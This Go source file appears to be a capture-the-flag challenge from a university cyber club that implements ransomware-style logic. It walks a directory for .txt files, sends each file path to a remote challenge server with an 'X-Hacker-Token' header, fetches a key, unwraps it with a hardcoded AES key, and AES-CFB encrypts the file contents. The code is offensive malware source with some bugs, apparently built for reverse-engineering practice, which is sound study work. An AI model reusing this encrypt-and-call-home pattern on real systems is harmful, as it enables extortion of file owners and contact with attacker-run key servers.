package encryptutils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
)

type receivedtoken struct {
	token string
}

func Decryptkey(data string) string {
	ct, _ := base64.StdEncoding.DecodeString(data)
	key := "dWFoe2szeV8zbmNyeXA3XzFuZ19rM3l9"
	block, _ := aes.NewCipher([]byte(key))

	if len(ct) < aes.BlockSize {
		return ""
	}

	iv := ct[:aes.BlockSize]
	ct = ct[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ct, ct)

	return string(ct)
}

func EncryptFile(file string) string {
	data, err := os.ReadFile(file)
	bytes := []byte(data)

	if err != nil {
		panic(nil)
	}

	client := http.Client{}
	req, _ := http.NewRequest("POST", "http://chal.ctf.uahcyber.club:5502", nil)
	req.Header.Set("X-Hacker-Token", "jo7aiXieShaephaevi4Ohvengiey0kah")
	req.Form.Add("file", file)
	res, err := client.Do(req)

	if err != nil {
		return ""
	}
	encoded_key := receivedtoken{}
	json.NewDecoder(res.Body).Decode(encoded_key)
	decoded_key := Decryptkey(encoded_key.token)

	block, err := aes.NewCipher([]byte(decoded_key))
	ct := make([]byte, aes.BlockSize+len(bytes))
	iv := ct[:aes.BlockSize]
	io.ReadFull(rand.Reader, iv)

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ct[aes.BlockSize:], bytes)

	fmt.Println(bytes)
	fmt.Println(base64.StdEncoding.EncodeToString(ct))

	return base64.StdEncoding.EncodeToString(ct)

}

func Findfiles() []string {
	var files []string
	root := "/home/veryspecificdir/"
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
		}
		if filepath.Ext(path) == ".txt" {
			files = append(files, path)
		}
		return nil
	})
	fmt.Println(files)
	return files
}
